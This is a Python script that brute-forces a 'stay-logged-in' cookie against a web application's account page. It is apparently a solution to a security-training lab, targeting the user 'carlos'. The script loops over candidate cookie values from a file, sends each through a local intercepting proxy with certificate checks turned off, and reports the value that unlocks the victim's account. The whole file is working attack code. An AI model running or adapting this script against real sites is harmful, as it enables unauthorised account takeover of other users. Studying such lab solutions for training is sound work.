import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def brut_forcer(url):
    line_counter = 0
    with open("ep.txt", "r") as encrypted_passwords:
        for line in encrypted_passwords:
            line_counter += 1
            code = line.strip()
            cookies = {'session':'dBb7g39zBrbavDg9SOZ1DG7qPFdJSRA8','stay-logged-in':code}
            params = {'id':"carlos"}
            response = requests.get(f"{url}/my-account", params=params ,cookies = cookies,verify = False, proxies = proxies)
            if "Update" in response.text or "Update email" in response.text:
                print (f"\nsuccess! encrypted cookie code is:{code}")
                print(f"\nsuccess! decrypted password line is: {line_counter}")
                break
            else:
                print(f"tried code: {code}")
                

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    brut_forcer(url)


if __name__ == "__main__":
    main()